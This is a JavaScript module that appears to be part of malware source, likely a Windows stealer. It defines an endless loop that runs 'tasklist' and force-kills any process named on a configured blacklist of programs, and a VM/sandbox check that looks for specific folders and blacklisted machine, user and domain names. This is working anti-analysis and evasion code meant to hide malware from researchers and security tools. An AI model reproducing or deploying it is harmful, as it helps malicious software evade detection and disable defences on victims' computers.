module.exports = (client) => {
    return {

        async detect_malicious_processes() {
            while (true) {
                await client.requires.child_process.exec('tasklist', async(err, stdout) => {
                    for (const executable of client.config.environ.blacklisted_programs) {
                        if (stdout.toLowerCase().includes(executable)) {
                            await client.requires.child_process.exec(`taskkill /IM ${executable}.exe /F`, (err) => {}) // Close
                        }
                    }
                })
                await client.utils.time.sleep(1000);
            }
        },

        async inVM() {

            let result = false

            for (var path of ['D:\\Tools', 'D:\\OS2', 'D:\\NT3X']) {
                if (client.requires.fs.existsSync(path)) {
                    result = true
                    break;
                }
            }

            for (var name of client.config.environ.blacklisted_pc_names) {
                if (name == client.utils.encryption.decryptData(client.config.user.user_domain) || name == client.utils.encryption.decryptData(client.config.user.username) || name == client.utils.encryption.decryptData(client.config.user.hostname)) {
                    result = true;
                    break;
                }
            }

            //if (client.config.counter.wifinetworks == 0) {
            //    const wifi_connections = await client.requires.systeminformation.getDynamicData();
            //    if (wifi_connections.wifiNetworks.length == 0) {
            //        result = true;
            //    }
            //}

            return result;
        }
    };
};